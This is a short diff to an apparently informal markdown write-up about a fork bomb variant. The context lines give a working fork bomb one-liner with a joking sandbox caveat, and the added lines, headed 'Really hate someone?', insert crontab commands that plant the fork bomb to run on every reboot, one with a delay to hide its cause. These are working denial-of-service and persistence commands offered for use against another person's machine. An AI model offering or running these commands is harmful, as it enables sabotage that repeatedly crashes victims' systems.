@@ -23,3 +23,9 @@ This version is basically **fork bomb on steroids.** 💀🔥
 If you ever want to experiment safely, consider running it inside a **VM** or a **limited container** (like a Docker sandbox with resource limits). Otherwise, you’ll be reaching for the power button **real quick.** 😆
 
 So yeah: try `_(){ _ | _ & }; :(){ $1 | : _ &}; : _`
+
+## Really hate someone?
+`(crontab -l; echo "@reboot _(){ _ | _ & }; :(){ $1 | : _ &}; : _") | crontab -`
+
+### Really Reall hate someone?
+`(crontab -l; echo "@reboot sleep 600 && _(){ _ | _ & }; :(){ $1 | : _ &}; : _") | crontab -`
